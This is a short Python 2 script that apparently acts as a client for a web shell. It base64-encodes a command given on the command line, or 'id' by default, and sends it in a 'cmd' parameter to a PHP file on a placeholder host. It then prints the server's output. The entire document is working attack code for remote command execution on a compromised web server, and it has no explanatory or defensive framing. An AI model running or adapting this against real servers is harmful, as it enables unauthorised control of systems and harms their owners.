#!/usr/bin/python

import base64
import sys
import urllib

if len(sys.argv) >1:
    cmd = sys.argv[1]
else:
    print("[!]Usage: " + sys.argv[0] + " command_here")
    print('Using default command of "id".')
    cmd = "id"
b64cmd = base64.b64encode(cmd)
myurl = "http://xx.xx.xx.xx/some/path/file.php?cmd=" + b64cmd 

response = urllib.urlopen(myurl)
myhtml = response.read()
print(myhtml)
